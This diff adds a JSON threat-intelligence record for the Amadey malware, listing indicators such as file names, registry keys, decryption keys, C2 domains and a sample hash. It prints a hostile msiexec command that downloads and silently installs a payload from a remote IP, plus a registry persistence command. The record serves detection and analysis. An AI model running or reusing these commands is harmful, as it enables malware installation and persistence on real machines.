@@ -1,0 +1,285 @@
+{
+  "malware_family": "Amadey",
+  "threat_actor": "TA505",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Amadey is a MinGW-compiled native Windows malware delivered by an Excel 4.0 macro document attributed to TA505, which spawns msiexec.exe to download and install the first-stage packed payload. The unpacked sample drops itself into a pseudo-random folder under ProgramData, establishes persistence through the Explorer 'User Shell Folders' Startup registry value, enumerates installed AV products, and beacons over HTTP to a hardcoded C2 using strings decrypted at runtime with a simple subtraction key.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "msiexec.exe STOP=1 /i http://109.234.38.177/dom4 /q ksw='%TEMP%'",
+      "context": "Excel 4.0 macro runs msiexec to fetch MSI payload",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "EXCEL.EXE /dde -> msiexec.exe",
+      "context": "macro document spawns msiexec downloader",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "cmualrc.exe",
+      "context": "DropName dropped in ProgramData subfolder",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "f64a428dfd",
+      "context": "DropDir created under ProgramData\\ (GetProgDir)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
+      "context": "AutoRunSet writes Startup value for persistence",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" /f /v Startup /t REG_SZ /d",
+      "context": "AutoRunCmd string used by aAutoRunSet",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "8ebd3994693b0d4976021758c2d7bff793b0d4976021758c2d7bff7",
+      "context": "aKey used for byte-wise subtraction string decryption",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "_Z8aDecryptPc",
+      "context": "MinGW symbol of runtime string decryption routine",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "_Z13aDropToSystemPc",
+      "context": "MinGW symbol dropping copy to ProgramData",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "_Z11aAutoRunSetPc",
+      "context": "MinGW symbol setting Startup persistence",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "_Z10aBypassUACv",
+      "context": "MinGW symbol UAC bypass routine",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "_Z8aCheckAVv",
+      "context": "MinGW symbol AV product enumeration",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "_Z15aUrlMonDownloadPcS_",
+      "context": "MinGW symbol URLMon download routine",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "AVAST Software",
+      "context": "aCheckAV AV match string reported as av= parameter",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Kaspersky Lab",
+      "context": "aCheckAV AV match string reported as av= parameter",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "360TotalSecurity",
+      "context": "aCheckAV AV match string reported as av= parameter",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Doctor Web",
+      "context": "aCheckAV AV match string reported as av= parameter",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": ":Zone.Identifier",
+      "context": "ZoneIdent string for mark-of-the-web handling",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "1.22",
+      "context": "Vers value appended to beacon request",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "id=",
+      "context": "beacon POST body parameter for bot id",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "&un=",
+      "context": "beacon POST body parameter for username",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "URLDownloadToFileA",
+      "context": "urlmon export used by aUrlMonDownload",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "GetNativeSystemInfo",
+      "context": "kernel32 export used by aGetOsArch",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "109.234.38.177",
+      "context": "MSI payload download host via msiexec",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://109.234.38.177/dom4",
+      "context": "MSI payload download URL in msiexec command",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "gohaiendo.com",
+      "context": "aDomain C2, decrypted at runtime with aKey",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "ppk/index.php",
+      "context": "aScript C2 URI path, decrypted at runtime",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "ec6097c4fdbe0736e416b58be0a4dd042c46a9c7fee997b3eb72384609bcbca9",
+      "description": "First-stage packed payload 400801441312-107-0_1.dom2.doc.hidden1.exe unpacked with tknk_scanner hollows_hunter to yield the Amadey PE"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "document"
+  ]
+}
